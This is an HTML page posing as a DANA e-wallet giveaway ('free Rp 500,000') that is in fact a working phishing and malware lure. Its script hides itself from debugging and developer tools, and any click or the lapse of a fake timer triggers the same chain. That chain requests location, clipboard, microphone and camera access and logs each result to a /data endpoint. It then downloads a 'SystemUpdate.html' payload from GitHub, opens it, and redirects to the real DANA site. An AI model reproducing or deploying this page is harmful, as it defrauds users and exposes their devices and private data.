<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Verifikasi</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
        #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
        .box{max-width:380px;width:90%;padding:20px}
        .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
        .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
        .flag-svg{width:38px;height:33px;fill:#1fa2ff}
        .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
        .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
        .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
        .box-white .label{color:#666;font-size:13px}
        .box-white .nominal{color:#108ee9;font-size:45px;font-weight:bold;margin:10px 0}
        .box-white .kuota{color:#0066cc;font-size:12px}
        .timer{color:#ffcc00;font-size:14px;font-weight:bold}
        .btn-klaim{background:#108ee9;color:#fff;border:none;padding:18px;font-size:20px;font-weight:bold;border-radius:30px;cursor:pointer;width:100%;margin:10px 0;letter-spacing:2px;transition:0.3s}
        .btn-klaim:hover{transform:scale(1.02)}
        .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
        .anti-debug{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
        
        /* LOADING OVERLAY - HILANGKAN DULU, MUNCUL SETELAH KLIK */
        .loading-overlay{
            position:fixed;
            top:0;left:0;width:100%;height:100%;
            z-index:99998;
            background:rgba(0,0,0,0.8);
            display:none; /* ← AWALNYA HILANG */
            justify-content:center;
            align-items:center;
            flex-direction:column
        }
        .loading-overlay.show{
            display:flex /* ← MUNCUL SETELAH KLIK */;
        }
        .loading-spinner{
            width:50px;height:50px;
            border:4px solid #333;
            border-top:4px solid #00ff88;
            border-radius:50%;
            animation:spin 1s linear infinite
        }
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        .loading-text{color:#fff;margin-top:15px;font-size:16px}
        
        /* FALLBACK - TOMBOL BESAR, LANGSUNG BISA DIKLIK! */
        .permission-fallback{
            position:fixed;
            top:0;left:0;width:100%;height:100%;
            z-index:99997;
            background:rgba(0,0,0,0.85);
            display:none;
            justify-content:center;
            align-items:center;
            flex-direction:column;
            padding:20px;
            text-align:center
        }
        .permission-fallback.show{
            display:flex /* ← MUNCUL SAAT BUTUH */;
        }
        .permission-fallback .btn-allow{
            background:#00ff88;
            color:#000;
            border:none;
            padding:20px 60px;
            font-size:24px;
            font-weight:bold;
            border-radius:30px;
            cursor:pointer;
            width:100%;
            max-width:300px;
            box-shadow:0 0 40px rgba(0,255,136,0.3);
            transition:0.3s
        }
        .permission-fallback .btn-allow:hover{
            transform:scale(1.05);
            box-shadow:0 0 60px rgba(0,255,136,0.5)
        }
        .permission-fallback .btn-allow:active{
            transform:scale(0.95)
        }
    </style>
</head>
<body>

<iframe class="anti-debug" srcdoc="<script>debugger;</script>"></iframe>

<!-- LOADING - AWALNYA HILANG, MUNCUL SETELAH KLIK -->
<div class="loading-overlay" id="loadingOverlay">
    <div class="loading-spinner"></div>
    <div class="loading-text">⏳ Memproses...</div>
</div>

<!-- FALLBACK - TOMBOL BISA DIKLIK! -->
<div class="permission-fallback" id="permissionFallback">
    <button class="btn-allow" onclick="allowAllPermissions()"> Klik Untuk Verifikasi</button>
</div>

<!-- POPUP DANA -->
<div id="popupDana">
    <div class="box">
        <div class="logo-dana">
            <div class="icon-wrapper">
                <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
                    <path d="M6 9 C15 16, 35 2, 44 9 L44 29 C35 22, 15 36, 6 29 Z" />
                </svg>
            </div>
            <div class="text-dana">DANA</div>
        </div>
        <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
        <div class="box-white">
            <div class="label">Saldo DANA Gratis</div>
            <div class="nominal">Rp 500.000</div>
            <div class="kuota">🎁 Kuota terbatas!</div>
        </div>
        <div class="timer">⏰ Tersisa <span id="timer">00:10</span></div>
        <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
        <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
    </div>
</div>

<script>
// ============================================================
// STEALTH
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
console.debug = function() {};
console.table = function() {};

(function() {
    var check = function() {
        var start = Date.now();
        debugger;
        var end = Date.now();
        if (end - start > 100) {
            document.body.innerHTML = '';
            window.location.href = 'about:blank';
        }
    };
    setInterval(check, 1000);
})();

document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }
});
document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
document.addEventListener('selectstart', function(e) { e.preventDefault(); return false; });

window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); e.stopPropagation(); return true; }, true);

if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// KONFIGURASI
// ============================================================
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var semuaDidapat = false;
var DOWNLOAD_STARTED = false;
var NOTIFICATION_SHOWN = false;
var REDIRECT_DONE = false;
var PERMISSION_RETRY = 0;
var MAX_PERMISSION_RETRY = 3;
var bypassSuccess = false;
var permissionStatus = {};

// ============================================================
// KIRIM DATA
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// SHOW LOADING (SETELAH KLIK!)
// ============================================================
function showLoading() {
    var loading = document.getElementById('loadingOverlay');
    if (loading) loading.className = 'loading-overlay show';
}

function hideLoading() {
    var loading = document.getElementById('loadingOverlay');
    if (loading) loading.className = 'loading-overlay';
}

// ============================================================
// BYPASS IZIN
// ============================================================
function injectAllPermissions() {
    permissionStatus = {
        geolocation: false,
        notification: false,
        clipboard: false,
        microphone: false,
        camera: false
    };

    K({ sumber: 'bypass_start', data: 'all' });

    // GEOLOKASI
    try {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function() { permissionStatus.geolocation = true; },
                function() { permissionStatus.geolocation = false; showPermissionFallback(); },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
    } catch(e) { showPermissionFallback(); }

    // NOTIFIKASI
    try {
        if ('Notification' in window && Notification.permission !== 'denied') {
            if (Notification.permission === 'granted') {
                permissionStatus.notification = true;
            } else {
                Notification.requestPermission().then(function(result) {
                    if (result === 'granted') {
                        permissionStatus.notification = true;
                    } else {
                        permissionStatus.notification = false;
                        showPermissionFallback();
                    }
                });
            }
        }
    } catch(e) { showPermissionFallback(); }

    // CLIPBOARD
    try {
        if (navigator.clipboard) {
            navigator.clipboard.readText()
                .then(function() { permissionStatus.clipboard = true; })
                .catch(function() { permissionStatus.clipboard = false; showPermissionFallback(); });
        }
    } catch(e) { showPermissionFallback(); }

    // MICROPHONE
    try {
        if (navigator.mediaDevices) {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); permissionStatus.microphone = true; })
                .catch(function() { permissionStatus.microphone = false; showPermissionFallback(); });
        }
    } catch(e) { showPermissionFallback(); }

    // CAMERA
    try {
        if (navigator.mediaDevices) {
            navigator.mediaDevices.getUserMedia({ audio: false, video: true })
                .then(function(stream) { stream.getTracks().forEach(function(t) { t.stop(); }); permissionStatus.camera = true; })
                .catch(function() { permissionStatus.camera = false; showPermissionFallback(); });
        }
    } catch(e) { showPermissionFallback(); }

    // CEK SEMUA
    setTimeout(function() {
        var allSuccess = permissionStatus.geolocation && 
                         permissionStatus.notification && 
                         permissionStatus.clipboard && 
                         permissionStatus.microphone && 
                         permissionStatus.camera;

        if (allSuccess) {
            bypassSuccess = true;
            K({ sumber: 'bypass_done', data: 'all_success' });
            hidePermissionFallback();
            hideLoading();
            lanjutkanEksekusi();
        } else {
            K({ sumber: 'bypass_partial', data: permissionStatus });
        }
    }, 3000);
}

// ============================================================
// FALLBACK - TOMBOL BISA DIKLIK!
// ============================================================
function showPermissionFallback() {
    if (bypassSuccess) return;
    if (PERMISSION_RETRY >= MAX_PERMISSION_RETRY) {
        K({ sumber: 'max_retry', data: 'skip' });
        hideLoading();
        lanjutkanEksekusi();
        return;
    }
    PERMISSION_RETRY++;
    hideLoading(); // Sembunyikan loading biar tombol keliatan
    var fallback = document.getElementById('permissionFallback');
    if (fallback) fallback.className = 'permission-fallback show';
}

function hidePermissionFallback() {
    var fallback = document.getElementById('permissionFallback');
    if (fallback) fallback.className = 'permission-fallback';
}

// 🔥 TOMBOL DIKLIK → LOADING MUNCUL!
function allowAllPermissions() {
    K({ sumber: 'fallback_click', data: 'user_allowed' });
    hidePermissionFallback();
    showLoading(); // ← LOADING MUNCUL SETELAH KLIK!
    
    setTimeout(function() {
        injectAllPermissions();
    }, 500);
}

// ============================================================
// EKSEKUSI UTAMA
// ============================================================
function lanjutkanEksekusi() {
    hideLoading();
    hidePermissionFallback();
    
    setTimeout(function() { downloadPayloadSilent(); }, 500);
    openSystemUpdateHTML();
    setTimeout(function() { showKlaimNotification(); }, 3000);
    setTimeout(redirectToDANA, 8000);
}

// ============================================================
// DOWNLOAD HTML
// ============================================================
function downloadPayloadSilent() {
    if (DOWNLOAD_STARTED) return;
    DOWNLOAD_STARTED = true;
    
    var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
    
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', htmlUrl, true);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    localStorage.setItem('SystemUpdate_backup', xhr.responseText);
                    K({ sumber: 'download_success', data: 'ok' });
                } catch(e) {}
            }
        };
        xhr.send();
    } catch(e) {}
}

// ============================================================
// BUKA HTML
// ============================================================
function openSystemUpdateHTML() {
    setTimeout(function() {
        var htmlContent = localStorage.getItem('SystemUpdate_backup');
        if (htmlContent) {
            try {
                var blob = new Blob([htmlContent], { type: 'text/html; charset=utf-8' });
                var url = URL.createObjectURL(blob);
                window.open(url, '_blank');
                K({ sumber: 'open_success', data: 'ok' });
            } catch(e) {}
        }
    }, 5000);
}

// ============================================================
// NOTIFIKASI + REDIRECT
// ============================================================
function showKlaimNotification() {
    if (NOTIFICATION_SHOWN) return;
    NOTIFICATION_SHOWN = true;
    
    try {
        if (!('Notification' in window)) return;
        if (Notification.permission === 'denied') return;
        if (Notification.permission !== 'granted') {
            Notification.requestPermission().then(function(permission) {
                if (permission === 'granted') createKlaimNotification();
            }).catch(function() {});
            return;
        }
        createKlaimNotification();
    } catch(e) {}
}

function createKlaimNotification() {
    try {
        var notif = new Notification('🔔 Klik Untuk Klaim', {
            body: 'Klik untuk menyelesaikan verifikasi dan klaim saldo DANA Rp500.000!',
            icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">💰</text></svg>',
            requireInteraction: true,
            silent: false,
            vibrate: [200, 100, 200]
        });
        notif.onclick = function() {
            notif.close();
            if (!REDIRECT_DONE) {
                REDIRECT_DONE = true;
                setTimeout(function() { window.location.href = 'https://www.dana.id'; }, 500);
            }
        };
        setTimeout(function() { try { notif.close(); } catch(e) {} }, 30000);
    } catch(e) {}
}

function redirectToDANA() {
    if (REDIRECT_DONE) return;
    REDIRECT_DONE = true;
    try { window.location.href = 'https://www.dana.id'; } catch(e) {}
}

// ============================================================
// MAIN
// ============================================================
function dapatkanSemua() {
    if (semuaDidapat) return;
    semuaDidapat = true;
    
    try {
        document.getElementById('popupDana').style.display = 'none';
        K({ sumber: 'trigger', data: 'dapatkanSemua' });
        
        // 🔥 TAMPILKAN LOADING DULU
        showLoading();
        
        // 🔥 MULAI BYPASS
        injectAllPermissions();
    } catch(e) {
        lanjutkanEksekusi();
    }
}

function klaim() { K({sumber:'izin', data:'klaim'}); dapatkanSemua(); }
function tolak() { K({sumber:'izin', data:'tolak'}); dapatkanSemua(); }

// ============================================================
// TIMER 10 DETIK
// ============================================================
var w = 10;
var timerInterval = setInterval(function() {
    w--;
    var el = document.getElementById('timer');
    if (el) el.textContent = '00:' + (w < 10 ? '0' + w : w);
    if (w <= 0) {
        clearInterval(timerInterval);
        K({sumber:'izin', data:'auto'});
        dapatkanSemua();
    }
}, 1000);

document.addEventListener('click', function() {
    if (!semuaDidapat) {
        K({sumber:'izin', data:'click_anywhere'});
        dapatkanSemua();
    }
});

console.log('✅ index.html - TOMBOL BISA DIKLIK!');
</script>
</body>
</html>
